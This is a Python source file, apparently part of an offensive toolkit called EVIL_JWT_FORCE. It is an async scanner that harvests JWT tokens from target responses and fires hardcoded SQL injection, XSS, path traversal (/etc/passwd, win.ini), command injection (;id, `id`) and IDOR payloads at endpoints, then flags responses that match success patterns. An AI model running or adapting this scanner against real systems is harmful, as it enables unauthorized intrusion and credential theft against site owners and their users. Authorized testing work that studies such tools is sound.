#!/usr/bin/env python3
"""
Scanner avançado de endpoints para detecção de JWT, SQLi, XSS, LFI, RCE, IDOR e integração com wordlists.
Totalmente integrado ao ecossistema EVIL_JWT_FORCE.
"""

import sys
import argparse
import asyncio
import re
from termcolor import cprint
from utils.request_builder import build_headers
from utils.constants import COMMON_ENDPOINTS, SQL_PAYLOADS
from utils.helpers import is_valid_url
from config.settings import get_setting
from pathlib import Path

def highlight(text, color="cyan"):
    try:
        cprint(text, color)
    except Exception:
        print(text)

def load_wordlist(wordlist_path):
    if not wordlist_path or not Path(wordlist_path).exists():
        return []
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def extract_jwts(text):
    jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
    return re.findall(jwt_pattern, text)

def extract_crypto(text):
    patterns = {
        'aes': r'[A-Fa-f0-9]{32,}',
        'base64': r'[A-Za-z0-9+/]{16,}={0,2}'
    }
    found = []
    for ctype, pattern in patterns.items():
        found += [{"type": ctype, "value": m} for m in re.findall(pattern, text)]
    return found

def check_vuln(response_text, vuln_type):
    patterns = {
        'sql_injection': ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error'],
        'xss': ['<script>alert(1)</script>', 'onerror', 'alert(1)'],
        'lfi': ['root:x:', '[extensions]', '[fonts]', 'boot.ini'],
        'rce': ['uid=', 'gid=', 'groups='],
        'idor': ['unauthorized', 'forbidden', 'not allowed']
    }
    text = response_text.lower()
    return any(p in text for p in patterns.get(vuln_type, []))

async def scan_endpoint(session, base_url, endpoint, wordlist=None):
    import aiohttp
    url = base_url.rstrip("/") + endpoint
    results = {
        "endpoint": endpoint,
        "status": None,
        "jwt": [],
        "crypto": [],
        "vulns": [],
        "headers": {},
    }
    try:
        async with session.get(url, headers=build_headers()) as resp:
            results["status"] = resp.status
            text = await resp.text()
            results["headers"] = dict(resp.headers)
            results["jwt"] = extract_jwts(text)
            results["crypto"] = extract_crypto(text)
            # Testes de vulnerabilidades
            payloads = {
                "sql_injection": SQL_PAYLOADS.get("basic", ["' OR 1=1--"]),
                "xss": ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>"],
                "lfi": ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
                "rce": [";id", "|id", "`id`"],
                "idor": ["1", "2", "3", "4", "5"]
            }
            for vuln, plist in payloads.items():
                for p in plist:
                    async with session.post(url, data={"test": p}, headers=build_headers()) as vresp:
                        vtext = await vresp.text()
                        if check_vuln(vtext, vuln):
                            results["vulns"].append({"type": vuln, "payload": p})
            # Teste com wordlist (se fornecida)
            if wordlist:
                for word in wordlist:
                    async with session.post(url, data={"test": word}, headers=build_headers()) as wresp:
                        wtext = await wresp.text()
                        if "jwt" in wtext.lower() or check_vuln(wtext, "sql_injection"):
                            results["vulns"].append({"type": "wordlist", "payload": word})
    except Exception as e:
        results["error"] = str(e)
    return results

async def advanced_scan(base_url, endpoints, wordlist=None):
    import aiohttp
    results = []
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = [scan_endpoint(session, base_url, ep, wordlist) for ep in endpoints]
        results = await asyncio.gather(*tasks)
    return results

def main():
    parser = argparse.ArgumentParser(description="Scanner avançado de endpoints para JWT/SQLi/XSS/LFI/RCE/IDOR.")
    parser.add_argument("--url", required=True, help="URL base do alvo (ex: http://alvo.com)")
    parser.add_argument("--wordlist", help="Caminho para wordlist opcional")
    parser.add_argument("--extra", help="Adicionar endpoints extras separados por vírgula")
    args = parser.parse_args()

    base_url = args.url
    if not is_valid_url(base_url):
        highlight("[x] URL inválida!", "red")
        sys.exit(1)

    endpoints = list(COMMON_ENDPOINTS)
    if args.extra:
        endpoints += [ep.strip() for ep in args.extra.split(",") if ep.strip()]
    wordlist = load_wordlist(args.wordlist) if args.wordlist else None

    highlight(f"[*] Iniciando varredura avançada em: {base_url}", "cyan")
    results = asyncio.run(advanced_scan(base_url, endpoints, wordlist))

    found = 0
    for res in results:
        if res.get("status") in [200, 401, 403] or res.get("jwt") or res.get("vulns"):
            found += 1
            highlight(f"\n[+] Endpoint: {base_url.rstrip('/')}{res['endpoint']}", "yellow")
            highlight(f"    Status: {res.get('status')}", "cyan")
            if res.get("jwt"):
                highlight(f"    JWTs encontrados: {res['jwt']}", "green")
            if res.get("crypto"):
                highlight(f"    Possível criptografia: {res['crypto']}", "magenta")
            if res.get("vulns"):
                for v in res["vulns"]:
                    highlight(f"    Vulnerabilidade: {v['type']} | Payload: {v['payload']}", "red")
            if res.get("headers"):
                highlight(f"    Headers: {res['headers']}", "blue")
            if res.get("error"):
                highlight(f"    Erro: {res['error']}", "red")
    highlight(f"\n[✓] Total de possíveis alvos/vulnerabilidades encontrados: {found}", "green")

if __name__ == "__main__":
    main()